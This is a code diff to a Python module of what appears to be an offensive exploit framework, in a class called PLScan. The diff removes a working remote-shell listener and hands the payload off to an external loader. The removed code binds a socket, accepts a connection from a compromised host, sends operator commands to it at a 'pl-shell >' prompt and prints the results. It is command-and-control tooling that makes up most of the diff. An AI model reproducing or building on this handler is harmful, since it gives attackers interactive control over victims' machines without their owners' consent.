@@ -23,7 +23,7 @@ docs = '''
 '''
 
 from modules.exploit import BGExploit
-from socket import *
+import lib.ple.hander.loder as loder
 
 
 class PLScan(BGExploit):
@@ -96,44 +96,10 @@ class PLScan(BGExploit):
     def payload(self):
         HOST   = self.option.target['default']
         PORT   = self.option.port['default']
-        BUFSIZ = 4096
-        ADDR   = (HOST, PORT)
-        sock   = socket(AF_INET, SOCK_STREAM)
-        sock.bind(ADDR)
-        sock.listen(5)
-        STOP_CHAT = False
-        #开始监听
-        print "Hander Listening %s port:%s" %(HOST,PORT)
-        try:
-            while not STOP_CHAT:
-                try:  
-                    tcpClientSock, addr = sock.accept()
-                except (KeyboardInterrupt):
-                    tcpClientSock.close()
-                    sock.close()
-                print('Start Listening %s  port %s.....') %(addr,PORT)
-                while True:
-                    data = raw_input('pl-shell >')
-                    try:
-                        tcpClientSock.send(data.encode('utf8'))
-                        if data.upper()=="BACK":
-                            break
-                        os_result = tcpClientSock.recv(BUFSIZ)
-                    except socket.timeout:
-                        tcpClientSock.close()
-                        break
-                    STOP_CHAT = (data.decode('utf8').upper()=="QUIT")
-                    if STOP_CHAT:
-                        break
-                    print(os_result)
-        except (KeyboardInterrupt):
-            tcpClientSock.close()
-            sock.close()
-        finally:
-            tcpClientSock.close()
-            sock.close()
+        loder.lunch(HOST,PORT)
+       
     def exploit(self):
-        payload()
+        self.payload()
 
 
 #下面为单框架程序执行，可以省略
